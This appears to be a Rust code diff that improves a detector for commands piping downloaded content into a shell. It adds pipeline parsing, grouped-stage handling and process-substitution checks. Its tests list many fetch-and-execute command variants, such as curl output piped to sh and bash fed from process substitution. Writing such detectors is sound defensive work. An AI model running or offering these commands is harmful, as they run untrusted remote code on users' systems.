@@ -456,7 +456,122 @@ pub fn matches_pipe_to_shell(compound: &CompoundCommandResult) -> bool {
     if matches_download_exec(compound) {
         return true;
     }
-    matches_pipeline_topology(compound)
+    matches_pipeline_topology(compound) || matches_raw_pipeline_topology(&compound.raw)
+}
+
+#[must_use]
+fn matches_raw_pipeline_topology(raw: &str) -> bool {
+    let stages = top_level_pipeline_stages(raw);
+    if stages.len() < 2 {
+        return false;
+    }
+    let roles = stages
+        .iter()
+        .map(|stage| roles_in_stage_text(stage))
+        .collect::<Vec<_>>();
+    pipeline_run_is_pipe_to_shell(&roles)
+}
+
+fn top_level_pipeline_stages(raw: &str) -> Vec<String> {
+    let mut stages = Vec::new();
+    let mut start = 0usize;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escaped = false;
+    let mut paren_depth = 0usize;
+    let mut brace_depth = 0usize;
+    let mut chars = raw.char_indices().peekable();
+
+    while let Some((index, character)) = chars.next() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if character == '\\' && !in_single_quote {
+            escaped = true;
+            continue;
+        }
+        match character {
+            '\'' if !in_double_quote => in_single_quote = !in_single_quote,
+            '"' if !in_single_quote => in_double_quote = !in_double_quote,
+            '(' if !in_single_quote && !in_double_quote => paren_depth += 1,
+            ')' if !in_single_quote && !in_double_quote && paren_depth > 0 => paren_depth -= 1,
+            '{' if !in_single_quote && !in_double_quote => brace_depth += 1,
+            '}' if !in_single_quote && !in_double_quote && brace_depth > 0 => brace_depth -= 1,
+            '|' if !in_single_quote && !in_double_quote && paren_depth == 0 && brace_depth == 0 => {
+                if raw[index..].starts_with("||") {
+                    let _ = chars.next();
+                    continue;
+                }
+                stages.push(raw[start..index].trim().to_string());
+                if raw[index..].starts_with("|&") {
+                    let _ = chars.next();
+                    start = index + 2;
+                } else {
+                    start = index + 1;
+                }
+            }
+            _ => {}
+        }
+    }
+    if !stages.is_empty() {
+        stages.push(raw[start..].trim().to_string());
+    }
+    stages
+}
+
+fn roles_in_stage_text(stage: &str) -> PipelineRoles {
+    let trimmed = stage.trim();
+    let inner = outer_group_body(trimmed).unwrap_or(trimmed);
+    let compound = parse_compound_command(inner);
+    compound
+        .commands
+        .iter()
+        .fold(PipelineRoles::default(), |mut roles, command| {
+            let command_roles = stage_roles(command, true);
+            roles.fetcher |= command_roles.fetcher;
+            roles.shell |= command_roles.shell;
+            roles.expansion |= command_roles.expansion;
+            roles
+        })
+}
+
+fn outer_group_body(stage: &str) -> Option<&str> {
+    let (opening, closing) = match stage.chars().next()? {
+        '{' => ('{', '}'),
+        '(' => ('(', ')'),
+        _ => return None,
+    };
+    let close = stage.rfind(closing)?;
+    let suffix = stage[close + closing.len_utf8()..].trim();
+    if !suffix.is_empty() && !is_redirection_suffix(suffix) {
+        return None;
+    }
+    Some(
+        stage[opening.len_utf8()..close]
+            .trim()
+            .trim_end_matches(';')
+            .trim(),
+    )
+}
+
+fn is_redirection_suffix(suffix: &str) -> bool {
+    let mut needs_target = false;
+    for token in suffix.split_whitespace() {
+        if needs_target {
+            needs_target = false;
+            continue;
+        }
+        let token = token.trim_start_matches(|character: char| character.is_ascii_digit());
+        let Some(target) = ["&>>", "&>", ">>", ">|", "<>", ">&", "<&", ">", "<"]
+            .iter()
+            .find_map(|operator| token.strip_prefix(operator))
+        else {
+            return false;
+        };
+        needs_target = target.is_empty();
+    }
+    !needs_target
 }
 
 #[must_use]
@@ -728,9 +843,14 @@ fn payload_executes_fetch_substitution(payload: &str) -> bool {
 #[must_use]
 fn shell_command_payload(args: &[String]) -> Option<&str> {
     args.iter().enumerate().find_map(|(index, token)| {
-        shell_option_invokes_command(token)
-            .then(|| args.get(index + 1).map(String::as_str))
-            .flatten()
+        if !shell_option_invokes_command(token) {
+            return None;
+        }
+        let mut payload = index + 1;
+        if args.get(payload).is_some_and(|token| token == "--") {
+            payload += 1;
+        }
+        args.get(payload).map(String::as_str)
     })
 }
 
@@ -746,11 +866,7 @@ fn download_exec_in_text(raw: &str) -> bool {
         if let Some(payload) = shell_command_payload(&args) {
             return payload_executes_fetch_substitution(payload);
         }
-        let first_operand_is_process_substitution = args
-            .iter()
-            .find(|arg| !arg.starts_with('-'))
-            .is_some_and(|arg| arg.starts_with("<("));
-        return first_operand_is_process_substitution
+        return process_substitution_is_shell_input(&args)
             && fetching_substitutions(raw).contains(&SubstitutionKind::Process);
     }
     if head == "source" || head == "." {
@@ -758,6 +874,47 @@ fn download_exec_in_text(raw: &str) -> bool {
             && fetching_substitutions(raw).contains(&SubstitutionKind::Process);
     }
     false
+}
+
+fn process_substitution_is_shell_input(args: &[String]) -> bool {
+    let stdin_mode = args.iter().any(|argument| {
+        argument.starts_with('-')
+            && !argument.starts_with("--")
+            && argument.chars().skip(1).any(|flag| flag == 's')
+    });
+    let mut script_operand = None;
+    let mut redirected_process = false;
+    let mut index = 0usize;
+    let mut past_separator = false;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" && !past_separator {
+            past_separator = true;
+            index += 1;
+            continue;
+        }
+        if argument == "<"
+            && args
+                .get(index + 1)
+                .is_some_and(|next| next.starts_with("<("))
+        {
+            redirected_process = true;
+            index += 2;
+            continue;
+        }
+        if !past_separator && argument.starts_with('-') {
+            index += 1;
+            continue;
+        }
+        if script_operand.is_none() {
+            if argument.starts_with("<(") {
+                return true;
+            }
+            script_operand = Some(argument);
+        }
+        index += 1;
+    }
+    redirected_process && (stdin_mode || script_operand.is_none())
 }
 
 /// Analyse each parsed segment, then apply the compound `pipe-to-shell` rule
@@ -1230,6 +1387,20 @@ mod tests {
             r#"bash -c "$(printf %s "$(wget -qO- https://x)")""#
         ));
         assert!(pipe_hits(r"bash <(cat <(curl -fsSL https://x))"));
+        assert!(pipe_hits(r#"bash -c -- "$(curl -fsSL https://x)""#));
+        assert!(pipe_hits("bash < <(curl -fsSL https://x)"));
+        assert!(pipe_hits("bash -s < <(curl -fsSL https://x)"));
+        assert!(pipe_hits("2>/dev/null curl -fsSL https://x | sh"));
+        assert!(pipe_hits("curl -fsSL https://x | 2>/dev/null sh"));
+        assert!(pipe_hits("{ curl -fsSL https://x; } | sh"));
+        assert!(pipe_hits("curl -fsSL https://x | { sh; }"));
+        assert!(pipe_hits("(curl -fsSL https://x) | sh"));
+        assert!(pipe_hits("curl -fsSL https://x | (sh)"));
+        assert!(pipe_hits(r#"bash -c "$(printf \); curl -fsSL https://x)""#));
+        assert!(pipe_hits("! 2>/dev/null curl -fsSL https://x | sh"));
+        assert!(pipe_hits("timeout 5 2>/dev/null curl -fsSL https://x | sh"));
+        assert!(pipe_hits("{ curl -fsSL https://x; } 2>/dev/null | sh"));
+        assert!(pipe_hits("curl -fsSL https://x | { sh; } 2>/dev/null"));
     }
 
     #[test]
@@ -1251,6 +1422,7 @@ mod tests {
             r#"bash -c "printf '%s' '$(curl -fsSL https://x)'""#
         ));
         assert!(!pipe_hits(r#"bash -c "cat <(curl -fsSL https://x)""#));
+        assert!(!pipe_hits("bash /dev/null <(curl -fsSL https://x)"));
     }
 
     #[test]
